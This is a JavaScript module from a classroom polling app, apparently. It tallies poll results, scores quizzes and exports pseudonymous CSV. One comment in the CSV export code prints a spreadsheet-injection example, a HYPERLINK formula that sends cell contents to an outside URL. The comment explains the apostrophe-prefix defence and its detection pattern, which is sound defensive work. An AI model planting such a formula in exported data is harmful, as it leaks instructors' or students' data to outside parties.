          dist: Object.fromEntries([...acc[i].dist.entries()].sort((a, b) => a[0] - b[0])),
        })),
      };
    }

    case 'ranking': {
      const items = Array.isArray(cfg.items) ? cfg.items : [];
      const n = items.length;
      const points = new Array(n).fill(0);
      let total = 0;
      for (const p of payloads) {
        const order = Array.isArray(p.order) ? p.order : [];
        if (!order.length) continue;
        total += 1;
        // Borda count: first place gets n points, next n-1, ... unranked 0.
        order.forEach((itemIndex, place) => {
          if (itemIndex >= 0 && itemIndex < n) points[itemIndex] += Math.max(0, n - place);
        });
      }
      const ranked = items
        .map((label, i) => ({
          label: typeof label === 'string' ? label : String(label?.label ?? ''),
          index: i,
          points: points[i],
        }))
        .sort((a, b) => b.points - a.points || a.index - b.index)
        .map((it, i) => ({ ...it, rank: i + 1 }));
      return { type, total, items: ranked };
    }

    case 'spectrum': {
      // Positions as individuals, deliberately NOT averaged — an average
      // opinion is a meaningless artifact; the shape is the content.
      // Pseudonyms ride along (the sanctioned label, never displayed) so
      // the same anonymous dot can migrate on a re-ask.
      const points = [];
      for (const r of rows || []) {
        const p = r && r.payload ? r.payload : r;
        const pos = Number(p?.pos);
        if (!Number.isFinite(pos)) continue;
        points.push({
          pos: Math.min(100, Math.max(0, pos)),
          pseudonym: r?.pseudonym || null,
        });
      }
      const corners = [0, 0, 0, 0]; // strongly-left, left, right, strongly-right
      for (const pt of points) corners[Math.min(3, Math.floor(pt.pos / 25))] += 1;
      return { type, total: points.length, points, corners };
    }

    case 'sample_vote': {
      const samples = (Array.isArray(cfg.samples) ? cfg.samples : []).map((s) => String(s ?? ''));
      const counts = new Array(samples.length).fill(0);
      const rationales = [];
      let total = 0;
      for (const p of payloads) {
        if (!Number.isInteger(p.choice) || p.choice < 0 || p.choice >= samples.length) continue;
        counts[p.choice] += 1;
        total += 1;
        const r = cleanText(p.rationale, 140);
        if (r) rationales.push({ choice: p.choice, text: r });
      }
      return {
        type, total,
        samples: samples.map((text, i) => ({
          text, count: counts[i], pct: total ? (counts[i] / total) * 100 : 0,
        })),
        rationales,
      };
    }

    case 'heatmap': {
      const segs = Array.isArray(cfg.segments) ? cfg.segments : [];
      const labels = cfg.mode === 'classify' && Array.isArray(cfg.labels) ? cfg.labels : null;
      const picks = new Array(segs.length).fill(0);
      const tagCounts = labels ? segs.map(() => new Array(labels.length).fill(0)) : null;
      let total = 0;
      for (const p of payloads) {
        let any = false;
        if (labels && p.tags && typeof p.tags === 'object') {
          for (const [k, v] of Object.entries(p.tags)) {
            const si = Number(k);
            const li = Number(v);
            if (tagCounts[si] && tagCounts[si][li] != null) {
              tagCounts[si][li] += 1;
              picks[si] += 1;
              any = true;
            }
          }
        } else if (Array.isArray(p.picks)) {
          for (const i of p.picks) {
            if (i >= 0 && i < segs.length) { picks[i] += 1; any = true; }
          }
        }
        if (any) total += 1;
      }
      const peak = Math.max(1, ...picks);
      return {
        type, total,
        mode: labels ? 'classify' : 'highlight',
        labels: labels ? labels.map((l) => String(l ?? '')) : [],
        segments: segs.map((text, i) => ({
          text: String(text ?? ''),
          count: picks[i],
          heat: picks[i] / peak,
          tags: tagCounts ? tagCounts[i] : null,
        })),
      };
    }

    case 'traffic':
    case 'mood': {
      const slots = type === 'traffic'
        ? trafficLabels(cfg).map((label) => ({ label, emoji: null }))
        : moodIcons(cfg).map((m) => ({ label: m.label, emoji: m.emoji }));
      const counts = new Array(slots.length).fill(0);
      let total = 0;
      for (const p of payloads) {
        if (!Number.isInteger(p.choice) || p.choice < 0 || p.choice >= counts.length) continue;
        counts[p.choice] += 1;
        total += 1;
      }
      return {
        type, total,
        options: slots.map((s, i) => ({
          ...s, count: counts[i], pct: total ? (counts[i] / total) * 100 : 0,
        })),
      };
    }

    case 'this_or_that': {
      const pairs = pairList(cfg);
      const left = new Array(pairs.length).fill(0);
      const right = new Array(pairs.length).fill(0);
      let total = 0;
      for (const p of payloads) {
        const picks = Array.isArray(p.picks) ? p.picks : [];
        let any = false;
        picks.forEach((v, i) => {
          if (i >= pairs.length) return;
          if (v === 0) { left[i] += 1; any = true; }
          else if (v === 1) { right[i] += 1; any = true; }
        });
        if (any) total += 1;
      }
      return {
        type, total,
        pairs: pairs.map((pair, i) => {
          const n = left[i] + right[i];
          return {
            left: pair.left, right: pair.right,
            leftCount: left[i], rightCount: right[i], count: n,
            // the split, as the left side's share — the bar is a rope,
            // and 50 means the room is genuinely torn
            leftPct: n ? (left[i] / n) * 100 : 50,
          };
        }),
      };
    }

    case 'budget': {
      const labels = optionLabels(cfg);
      const total = budgetTotal(cfg);
      const sums = new Array(labels.length).fill(0);
      const values = labels.map(() => []);
      let n = 0;
      for (const p of payloads) {
        const alloc = Array.isArray(p.alloc) ? p.alloc : [];
        if (!alloc.some((v) => Number(v) > 0)) continue;
        n += 1;
        labels.forEach((_, i) => {
          const v = Number(alloc[i]);
          const clean = Number.isFinite(v) && v > 0 ? v : 0;
          sums[i] += clean;
          values[i].push(clean);
        });
      }
      const pot = n * total;
      return {
        type, total: n, pot: total,
        // Share of the whole room's money, not the mean of the means —
        // the two differ the moment anyone skips, and the first is the
        // one that answers "what did the room fund?"
        options: labels.map((label, i) => ({
          label,
          points: sums[i],
          share: pot ? (sums[i] / pot) * 100 : 0,
          avg: n ? sums[i] / n : 0,
          // every individual allocation, so the chart can show that an
          // average of 25 was six people at zero and two at a hundred
          values: values[i],
          zeros: values[i].filter((v) => v === 0).length,
        })),
      };
    }

    case 'probability': {
      const values = [];
      for (const p of payloads) {
        const v = Number(p.pct);
        if (Number.isFinite(v)) values.push(Math.min(100, Math.max(0, v)));
      }
      const bins = new Array(10).fill(0);
      for (const v of values) bins[Math.min(9, Math.floor(v / 10))] += 1;
      const sorted = [...values].sort((a, b) => a - b);
      const median = sorted.length
        ? (sorted.length % 2
          ? sorted[(sorted.length - 1) / 2]
          : (sorted[sorted.length / 2 - 1] + sorted[sorted.length / 2]) / 2)
        : null;
      const truth = Number.isFinite(Number(cfg.truth)) && cfg.truth !== null && cfg.truth !== ''
        ? Math.min(100, Math.max(0, Math.round(Number(cfg.truth))))
        : null;
      return { type, total: values.length, values, bins, median, truth };
    }

    case 'cloze': {
      const blanks = clozeBlanks(cfg);
      const tallies = blanks.map(() => new Map());
      let total = 0;
      for (const p of payloads) {
        const given = Array.isArray(p.blanks) ? p.blanks : [];
        let any = false;
        blanks.forEach((_, i) => {
          const text = cleanText(given[i], 40);
          if (!text) return;
          const key = cfg.case_sensitive ? text : text.toLocaleLowerCase();
          const cur = tallies[i].get(key) || { text, count: 0 };
          cur.count += 1;
          tallies[i].set(key, cur);
          any = true;
        });
        if (any) total += 1;
      }
      return {
        type, total,
        // the sentence travels with its results: the projector draws the
        // prose, not just the tally, and shouldn't have to re-read config
        parts: clozeParts(cfg.text),
        blanks: blanks.map((b, i) => {
          const answers = [...tallies[i].values()]
            .map((a) => ({
              ...a,
              correct: clozeMatches(b.answers, a.text, !!cfg.case_sensitive),
            }))
            .sort((x, y) => y.count - x.count || x.text.localeCompare(y.text));
          const answered = answers.reduce((s, a) => s + a.count, 0);
          const right = answers.filter((a) => a.correct === true)
            .reduce((s, a) => s + a.count, 0);
          return {
            key: b.answers,
            answers: answers.slice(0, 12),
            distinct: answers.length,
            count: answered,
            correct: right,
            pct: answered ? (right / answered) * 100 : 0,
          };
        }),
      };
    }

    case 'matching': {
      const pairs = pairList(cfg);
      const n = pairs.length;
      // counts[left][right] — the confusion matrix. The diagonal is
      // "right"; everything off it is a specific, nameable mix-up, which
      // is the thing worth teaching to.
      const counts = pairs.map(() => new Array(n).fill(0));
      let total = 0;
      let exact = 0;
      for (const p of payloads) {
        const matches = Array.isArray(p.matches) ? p.matches : [];
        let any = false;
        let allRight = true;
        pairs.forEach((_, i) => {
          const v = matches[i];
          if (!Number.isInteger(v) || v < 0 || v >= n) { allRight = false; return; }
          counts[i][v] += 1;
          any = true;
          if (v !== i) allRight = false;
        });
        if (any) total += 1;
        if (any && allRight) exact += 1;
      }
      const rows = pairs.map((pair, i) => {
        const answered = counts[i].reduce((s, c) => s + c, 0);
        const worst = counts[i]
          .map((c, j) => ({ j, c }))
          .filter((x) => x.j !== i && x.c > 0)
          .sort((a, b) => b.c - a.c)[0] || null;
        return {
          left: pair.left,
          right: pair.right,
          counts: counts[i],
          count: answered,
          correct: counts[i][i],
          pct: answered ? (counts[i][i] / answered) * 100 : 0,
          confusedWith: worst ? { index: worst.j, label: pairs[worst.j].right, count: worst.c } : null,
        };
      });
      return {
        type, total, exact,
        rights: pairs.map((p) => p.right),
        rows,
      };
    }

    case 'timeline': {
      const items = timelineItems(cfg);
      const n = items.length;
      // places[item][position] — where the room put each event. The
      // config's own order IS the answer key, so item i belongs at i.
      const places = items.map(() => new Array(n).fill(0));
      const points = new Array(n).fill(0);
      let total = 0;
      let exact = 0;
      for (const p of payloads) {
        const order = Array.isArray(p.order) ? p.order : [];
        if (!order.length) continue;
        total += 1;
        let allRight = order.length === n;
        order.forEach((itemIndex, place) => {
          if (itemIndex < 0 || itemIndex >= n) return;
          if (place < n) places[itemIndex][place] += 1;
          points[itemIndex] += Math.max(0, n - place);
          if (itemIndex !== place) allRight = false;
        });
        if (allRight) exact += 1;
      }
      const consensus = items
        .map((label, i) => ({ label, index: i, points: points[i] }))
        .sort((a, b) => b.points - a.points || a.index - b.index)
        .map((it, i) => ({ ...it, place: i }));
      return {
        type, total, exact,
        items: items.map((label, i) => {
          const answered = places[i].reduce((s, c) => s + c, 0);
          return {
            label,
            index: i,
            places: places[i],
            count: answered,
            correct: places[i][i] || 0,
            pct: answered ? ((places[i][i] || 0) / answered) * 100 : 0,
          };
        }),
        consensus,
      };
    }

    case 'exit_ticket': {
      const prompts = exitPrompts(cfg);
      const columns = prompts.map((label) => ({ label, entries: [] }));
      let total = 0;
      for (const p of payloads) {
        const answers = Array.isArray(p.answers) ? p.answers : [];
        let any = false;
        prompts.forEach((_, i) => {
          const text = cleanText(answers[i], 1000);
          if (!text) return;
          columns[i].entries.push({ text });
          any = true;
        });
        if (any) total += 1;
      }
      return { type, total, columns };
    }

    default:
      return { type, total: 0 };
  }
}

/**
 * The confidence quadrant (pedagogy roadmap, feature 2): crossing
 * right/wrong with sure/unsure. "Confident and wrong" is the misconception
 * signal — the highest-value read-out a formative question can produce
 * (Gardner-Medwin's certainty-based marking, used diagnostically).
 * Returns null when nobody reported confidence or there is no answer key.
 */
function confidenceSplit(payloads, correct, type) {
  const withConf = payloads.filter((p) => p.conf === 1 || p.conf === 2 || p.conf === 3);
  if (!withConf.length) return null;
  const counts = [0, 0, 0]; // guessing / fairly sure / certain
  for (const p of withConf) counts[p.conf - 1] += 1;
  const out = { counts, n: withConf.length };
  if (correct && correct.length) {
    const quad = { sureRight: 0, sureWrong: 0, unsureRight: 0, unsureWrong: 0 };
    for (const p of withConf) {
      const picks = Number.isInteger(p.choice) ? [p.choice]
        : (Array.isArray(p.choices) ? p.choices : []);
      if (!picks.length) continue;
      const right = picks.every((i) => correct.includes(i));
      const sure = p.conf === 3;
      if (sure && right) quad.sureRight += 1;
      else if (sure && !right) quad.sureWrong += 1;
      else if (!sure && right) quad.unsureRight += 1;
      else quad.unsureWrong += 1;
    }
    out.quad = quad;
  }
  return out;
}

// =====================================================================
// Quiz scoring
// =====================================================================

/**
 * Time-decay scoring, matching the model instructors know from
 * Mentimeter/Poll Everywhere: a correct answer is worth `max` points,
 * decaying linearly with how long it took, floored at `min`.
 * A wrong answer is worth nothing.
 */
export function scoreAnswer(payload, config, { max = 1000, min = 500 } = {}) {
  const correct = correctIndices(config);
  if (!payload || !Number.isInteger(payload.choice)) return 0;
  if (!correct.includes(payload.choice)) return 0;

  if (config?.scoring === 'fixed') return max;

  const limitMs = (Number(config?.time) > 0 ? Number(config.time) : 20) * 1000;
  const ms = Number.isFinite(payload.ms) && payload.ms >= 0 ? payload.ms : limitMs;
  const frac = Math.min(1, ms / limitMs);
  return Math.round(max - (max - min) * frac);
}

/**
 * Session leaderboard.
 * @param {Array<{question: object, rows: Array<{pseudonym: string, payload: object}>}>} perQuestion
 */
export function quizLeaderboard(perQuestion, opts) {
  const totals = new Map();
  for (const { question, rows } of perQuestion || []) {
    if (!question || question.type !== 'quiz') continue;
    for (const row of rows || []) {
      if (!row?.pseudonym) continue;
      const pts = scoreAnswer(row.payload, question.config, opts);
      const cur = totals.get(row.pseudonym) || { pseudonym: row.pseudonym, score: 0, correct: 0, answered: 0 };
      cur.score += pts;
      cur.answered += 1;
      if (pts > 0) cur.correct += 1;
      totals.set(row.pseudonym, cur);
    }
  }
  return [...totals.values()]
    .sort((a, b) => b.score - a.score || a.pseudonym.localeCompare(b.pseudonym))
    .map((e, i) => ({ ...e, rank: i + 1 }));
}

// =====================================================================
// Re-ask / delta (proposal P1)
//
// The whole point of asking twice is seeing what MOVED. Incumbents can
// show two rounds side by side at best; this computes the change so the
// projector can animate it.
// =====================================================================

export function computeDelta(before, after) {
  if (!before || !after || before.type !== after.type) return null;

  if (before.type === 'multiple_choice' || before.type === 'quiz') {
    const n = Math.max(before.options.length, after.options.length);
    const options = [];
    for (let i = 0; i < n; i += 1) {
      const b = before.options[i] || { label: '', count: 0, pct: 0 };
      const a = after.options[i] || { label: '', count: 0, pct: 0 };
      options.push({
        label: a.label || b.label,
        beforePct: b.pct, afterPct: a.pct, deltaPct: a.pct - b.pct,
        beforeCount: b.count, afterCount: a.count, deltaCount: a.count - b.count,
      });
    }
    const moved = options.reduce((s, o) => s + Math.abs(o.deltaPct), 0) / 2;
    return { type: before.type, options, moved, beforeTotal: before.total, afterTotal: after.total };
  }

  if (before.type === 'scales') {
    const statements = before.statements.map((b, i) => {
      const a = after.statements[i] || { label: b.label, avg: null };
      return {
        label: b.label,
        beforeAvg: b.avg, afterAvg: a.avg,
        deltaAvg: (a.avg == null || b.avg == null) ? null : a.avg - b.avg,
      };
    });
    return { type: 'scales', statements, min: before.min, max: before.max,
             beforeTotal: before.total, afterTotal: after.total };
  }

  return null;
}

// =====================================================================
// CSV export (proposal P5 — never paywalled, never identifying)
// =====================================================================

/**
 * Cells a spreadsheet would run as a formula rather than read as text.
 *
 * The whole point of this export is "open it in Excel", and an open-ended
 * answer is a box a student types anything into. `=HYPERLINK("http://…"&A1,
 * "Grades")` typed into that box is a live link that fires when the
 * instructor opens the file — quoting the cell does not stop it, because
 * the quotes are stripped before the formula is evaluated.
 *
 * A leading apostrophe is the standard mitigation: Excel, LibreOffice and
 * Sheets all read it as "this cell is text" and do not show it. Plain
 * negative numbers are left alone, so a numeric column stays numeric.
 */
const CSV_FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

export function toCSVValue(v) {
  if (v == null) return '';
  let s = String(v);
  if (CSV_FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function buildCSV(rows, headers) {
  const cols = headers || (rows.length ? Object.keys(rows[0]) : []);
  const lines = [cols.map(toCSVValue).join(',')];
  for (const row of rows) lines.push(cols.map((c) => toCSVValue(row[c])).join(','));
  // \r\n keeps Excel happy; BOM is added at download time for accents.
  return lines.join('\r\n');
}

/** Render one response payload as a single human-readable cell. */
export function payloadToText(type, config, payload) {
  if (!payload) return '';
  const cfg = config || {};
  switch (type) {
    case 'multiple_choice': {
      const labels = optionLabels(cfg);
      return (payload.choices || []).map((i) => labels[i] ?? `#${i}`).join(' | ');
    }
    case 'quiz': {
      const labels = optionLabels(cfg);
      return labels[payload.choice] ?? '';
    }
    case 'word_cloud':
      return (payload.words || []).join(' | ');
    case 'open_ended':
      return payload.text || '';
    case 'scales': {
      const st = Array.isArray(cfg.statements) ? cfg.statements : [];
      return (payload.values || [])
        .map((v, i) => (v == null ? null : `${optionLabel(st[i]) || `S${i + 1}`}=${v}`))
        .filter(Boolean).join(' | ');
    }
    case 'ranking': {
      const items = Array.isArray(cfg.items) ? cfg.items : [];
      return (payload.order || []).map((i, place) => `${place + 1}. ${optionLabel(items[i]) || `#${i}`}`).join(' | ');
    }
    case 'spectrum': {
      const left = cfg.left_label || 'left';
      const right = cfg.right_label || 'right';
      return payload.pos == null ? '' : `${payload.pos} (0=${left}, 100=${right})`;
    }
    case 'sample_vote': {
      const base = Number.isInteger(payload.choice) ? `Sample ${payload.choice + 1}` : '';
      return payload.rationale ? `${base}: ${payload.rationale}` : base;
    }
    case 'heatmap': {
      const labels = Array.isArray(cfg.labels) ? cfg.labels : [];
      if (payload.tags && typeof payload.tags === 'object') {
        return Object.entries(payload.tags)
          .map(([si, li]) => `S${Number(si) + 1}=${labels[li] ?? `L${li}`}`)
          .join(' | ');
      }
      return (payload.picks || []).map((i) => `S${i + 1}`).join(' | ');
    }
    case 'traffic':
      return trafficLabels(cfg)[payload.choice] ?? '';
    case 'mood': {
      const m = moodIcons(cfg)[payload.choice];
      return m ? (m.label || m.emoji) : '';
    }
    case 'this_or_that': {
      const pairs = pairList(cfg);
      return (payload.picks || [])
        .map((v, i) => {
          const p = pairs[i];
          if (!p || v == null) return null;
          return `${p.left} vs ${p.right}=${v === 0 ? p.left : p.right}`;
        })
        .filter(Boolean).join(' | ');
    }
    case 'budget': {
      const labels = optionLabels(cfg);
      return (payload.alloc || [])
        .map((v, i) => (v > 0 ? `${labels[i] || `#${i + 1}`}=${v}` : null))
        .filter(Boolean).join(' | ');
    }
    case 'probability':
      return payload.pct == null ? '' : `${payload.pct}%`;
    case 'cloze': {
      const blanks = clozeBlanks(cfg);
      return (payload.blanks || [])
        .map((text, i) => {
          if (!text) return null;
          const hit = clozeMatches(blanks[i]?.answers, text, !!cfg.case_sensitive);
          return `${i + 1}. ${text}${hit === null ? '' : hit ? ' ✓' : ' ✗'}`;
        })
        .filter(Boolean).join(' | ');
    }
    case 'matching': {
      const pairs = pairList(cfg);
      return (payload.matches || [])
        .map((v, i) => {
          if (v == null || !pairs[i]) return null;
          return `${pairs[i].left}=${pairs[v]?.right ?? `#${v}`}${v === i ? ' ✓' : ' ✗'}`;
        })
        .filter(Boolean).join(' | ');
    }
    case 'timeline': {
      const items = timelineItems(cfg);
      return (payload.order || [])
        .map((i, place) => `${place + 1}. ${items[i] || `#${i}`}${i === place ? ' ✓' : ' ✗'}`)
        .join(' | ');
    }
    case 'exit_ticket': {
      const prompts = exitPrompts(cfg);
      return (payload.answers || [])
        .map((text, i) => (text ? `${prompts[i] || `#${i + 1}`}: ${text}` : null))
        .filter(Boolean).join(' | ');
    }
    default:
      return JSON.stringify(payload);
  }
}

/**
 * The `correct` CSV column, for the types that have a key.
 *
 * Empty string, not "no", for everything unkeyed: an opinion has no
 * correctness, and a column of "no" against a mood check would read as a
 * verdict on students for how their day is going.
 *
 * For the types answered in several parts (blanks, pairs, an order) the
 * cell is "3/4" rather than yes/no, because a partly-right answer is the
 * normal case there and flattening it to "no" throws away the grade.
 */
export function answerCorrectness(type, config, payload) {
  if (!payload) return '';
  const cfg = config || {};
  const part = (right, of) => (of ? `${right}/${of}` : '');

  switch (type) {
    case 'quiz':
      return correctIndices(cfg).includes(payload.choice) ? 'yes' : 'no';
    case 'multiple_choice': {
      const key = correctIndices(cfg);
      if (cfg.mode !== 'best' || !key.length) return '';
      const picks = Array.isArray(payload.choices) ? payload.choices : [];
      if (!picks.length) return '';
      return picks.every((i) => key.includes(i)) ? 'yes' : 'no';
    }
    case 'cloze': {
      const blanks = clozeBlanks(cfg);
      const given = Array.isArray(payload.blanks) ? payload.blanks : [];
      let keyed = 0;
      let right = 0;
      blanks.forEach((b, i) => {
        const hit = clozeMatches(b.answers, given[i], !!cfg.case_sensitive);
        if (hit === null) return;
        keyed += 1;
        if (hit) right += 1;
      });
      return part(right, keyed);
    }
    case 'matching': {
      const pairs = pairList(cfg);
      const matches = Array.isArray(payload.matches) ? payload.matches : [];
      const answered = matches.filter((m) => m != null).length;
      if (!answered) return '';
      return part(matches.filter((m, i) => m === i).length, pairs.length);
    }
    case 'timeline': {
      const items = timelineItems(cfg);
      const order = Array.isArray(payload.order) ? payload.order : [];
      if (!order.length) return '';
      return part(order.filter((itemIndex, place) => itemIndex === place).length, items.length);
    }
    default:
      return '';
  }
}

/**
 * Flatten a whole session into CSV rows.
 *
 * FERPA: the identity column is `respondent`, which holds the random
 * session-scoped pseudonym. There is no name, email, ID, or IP column,
 * because none of those values exists anywhere in the system.
 */
export function sessionToCSVRows(session, questions, responses) {
  const byId = new Map(questions.map((q) => [q.id, q]));
  // The same numbering the projector and every phone showed. A deck that
  // opens with an instructions slide told the room "Question 1 of 8"; the
  // export has to say question 1 too, or the instructor cannot match a
  // row to the question they remember asking. Content slides collect no
  // responses, so they only appear here as a defensive 0.
  const numbers = new Map();
  sortedQuestions(questions)
    .filter((q) => !isContentSlide(q.type))
    .forEach((q, i) => numbers.set(q.id, i + 1));
  const out = [];
  for (const r of responses) {
    const q = byId.get(r.question_id);
    if (!q) continue;
    out.push({
      session: session?.label || session?.join_code || '',
      question_number: numbers.get(q.id) ?? 0,
      question_type: TYPE_LABELS[q.type] || q.type,
      question: q.prompt,
      round: r.round,
      respondent: r.pseudonym,
      answer: payloadToText(q.type, q.config, r.payload),
      correct: answerCorrectness(q.type, q.config, r.payload),
      points: q.type === 'quiz' ? scoreAnswer(r.payload, q.config) : '',
      submitted_at: r.created_at || '',
    });
  }
  out.sort((a, b) =>
    a.question_number - b.question_number ||
    a.round - b.round ||
    String(a.respondent).localeCompare(String(b.respondent)));
  return out;
}

export const CSV_HEADERS = [
  'session', 'question_number', 'question_type', 'question', 'round',
  'respondent', 'answer', 'correct', 'points', 'submitted_at',
];

// =====================================================================
// Question identity across sessions (pedagogy roadmap, features 5–6)
//
// The plain-text deck format deliberately has no persistent question ids
// (decks are duplicated by copying files), so "the same question asked in
// another session" is identified by its normalized prompt text. Editing a
// prompt breaks the link — acceptable, and visible to the instructor.
// =====================================================================

export function promptKey(prompt) {
  return String(prompt || '')
    .normalize('NFKC')
    .toLocaleLowerCase()
    .replace(/[^\p{L}\p{N}]+/gu, ' ')
    .trim();
}

// =====================================================================
// Session navigation
// =====================================================================

export function sortedQuestions(questions) {
  return [...(questions || [])].sort((a, b) => (a.position ?? 0) - (b.position ?? 0));
}

/**
 * Where a question sits *among questions*.
 *
 * A deck's slides and its questions are no longer the same list: put an
 * instructions slide at the front and slide 2 is question 1. The room is
 * told "Question 1 of 8", not "Question 2 of 9", because the count they
 * care about is how many times they will be asked to answer.
 *
 * @returns {{number: number, total: number}} number is 0 for a content slide
 */
export function questionNumber(questions, id) {
  const asked = sortedQuestions(questions).filter((q) => !isContentSlide(q.type));
  const i = asked.findIndex((q) => q.id === id);
  return { number: i + 1, total: asked.length };
}

export function neighbourQuestion(questions, currentId, step) {
  const list = sortedQuestions(questions);
  if (!list.length) return null;
  const idx = list.findIndex((q) => q.id === currentId);
  if (idx === -1) return list[0];
  const next = idx + step;
  if (next < 0 || next >= list.length) return null;
  return list[next];
}

/**
 * A 6-character code with no vowels (so it can't spell anything) and no
 * characters that get misread from the back of a room: 0/O, 1/I/L.
 */
export function generateJoinCode(len = 6, rnd = Math.random) {
  const alphabet = '23456789BCDFGHJKMNPQRSTVWXYZ';
  let out = '';
  for (let i = 0; i < len; i += 1) out += alphabet[Math.floor(rnd() * alphabet.length)];
  return out;
}

/**
 * The one join link, used for the QR, for what the projector prints, and
 * for anything handed to a student.
 *
 * `/join` rather than `/join.html`: the extensionless path is what every
 * screen tells the room to type, and a QR that resolved somewhere else —
 * even to the same page — is a second address for one door. The Worker
 * serves join.html there (see worker/index.js and .assetsignore), as does
 * GitHub Pages for a static mirror.
 */
export function joinURL(baseURL, code) {
  const base = String(baseURL || '').replace(/\/+$/, '');
  return `${base}/join#${encodeURIComponent(code)}`;
}

/**
 * The same link with the parts a person does not type removed: no
 * scheme, no code fragment. Deliberately keeps the `/join` path — the
 * projector used to print a bare host, so the room was told to go to
 * "surveyall.org" while the QR and every other screen said
 * "surveyall.org/join".
 */
export function joinURLPretty(baseURL, code) {
  return joinURL(baseURL, code).replace(/^https?:\/\//, '').replace(/#.*$/, '');
}
